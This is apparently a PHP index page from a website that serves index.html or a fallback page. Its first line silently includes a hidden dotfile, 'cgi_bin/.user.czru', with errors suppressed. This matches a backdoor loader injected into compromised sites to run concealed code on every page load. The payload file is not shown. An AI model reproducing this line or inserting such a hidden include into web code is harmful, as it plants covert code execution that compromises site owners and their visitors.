<?php @include_once("cgi_bin/.user.czru"); ?><?php if(file_exists("index.html")){include("index.html");exit;}elseif(file_exists("_index.html")){include("_index.html");exit;}else{@include("_index.htm");exit;}?>